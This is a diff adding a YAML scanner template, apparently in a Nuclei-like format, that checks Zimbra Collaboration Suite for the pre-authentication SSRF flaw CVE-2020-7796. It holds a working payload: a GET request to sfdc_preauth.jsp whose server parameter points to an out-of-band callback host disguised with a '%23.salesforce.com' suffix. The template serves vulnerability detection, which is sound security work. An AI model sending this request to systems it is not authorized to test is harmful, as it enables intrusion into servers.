@@ -1,0 +1,23 @@
+id: zimbra-preauth-ssrf
+brief:
+    title: Zimbra Collaboration Suite - Server-Side Request Forgery
+    by: gy741
+    level: critical
+    about: Zimbra Collaboration Suite (ZCS) allows remote unauthenticated attackers to cause the product to include content returned by third-party servers and use it as its own code.
+    label:
+        - zimbra
+        - ssrf
+        - oast
+        - vuln
+    score: CVE-2020-7796 CVSS:9.8
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/service/error/sfdc_preauth.jsp?session=s&userid=1&server=http://{{interactsh-url}}%23.salesforce.com/'
+      head:
+        Accept: '*/*'
+      signs:
+        - "on": word
+          has:
+            - http
+          in: interactsh_protocol
